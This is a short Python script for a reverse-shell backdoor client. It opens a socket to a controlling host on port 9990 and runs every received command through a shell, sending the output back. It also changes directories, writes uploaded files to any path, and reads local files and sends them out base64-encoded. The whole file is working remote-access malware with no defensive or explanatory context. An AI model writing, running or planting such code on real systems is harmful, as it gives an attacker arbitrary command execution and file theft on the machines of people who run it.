from datetime import datetime
import json
import os
import socket 
import subprocess
import time
from typing import List
import base64
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect(("0.0.0.0", 9990))
print("Success connect")

    
while True:
    command = client_socket.recv(1024).decode()
    try:
        if "cd" in command:
            # cd /home/user/test
            list_command = command.split(' ')
            os.chdir(list_command[1])
            client_socket.send(f"Change directory on {list_command[1]}".encode())
        elif "upload" in command:

            _, path_on_client, full_size, data = command.split(' ')

            while len(data) != int(full_size):
                data = data + client_socket.recv(1024).decode()
            data = base64.b64decode(data)
            
            with open(path_on_client, "wb") as file:
                file.write(data)
                
            _, file = path_on_client.split("/")
            client_socket.send(f"File {file} is uploaded".encode())

        elif "download" in command:
            _, path_on_client = command.split(' ')
            with open(path_on_client, 'rb') as file:
                data = file.read()
            data = base64.b64encode(data)

            response = str(len(data)) + " "
            client_socket.send(response.encode() + data)

        else:
            ex = subprocess.check_output(command, shell=True).decode()
            if not ex:
                client_socket.send(b"\n")
            else:
                client_socket.send(ex.encode())
    except subprocess.CalledProcessError:
        client_socket.send("Not found command\n".encode())